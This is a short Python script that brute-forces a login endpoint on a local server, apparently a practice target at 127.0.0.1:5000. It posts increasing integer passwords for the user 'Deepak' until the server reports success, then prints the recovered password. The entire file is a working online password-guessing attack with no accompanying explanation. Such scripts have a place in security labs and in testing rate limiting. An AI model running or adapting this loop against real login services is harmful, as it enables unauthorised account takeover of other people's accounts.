import json
from requests import post as POST

URL = 'http://127.0.0.1:5000/login'

if __name__ == '__main__':
	success = False
	guess_password = 0
	while not success:
		response = POST(URL, data={'username': 'Deepak', 'password': str(guess_password)})
		success = json.loads(response.text).get('success')
		if success:
			print(f'Password is {guess_password}')
		guess_password += 1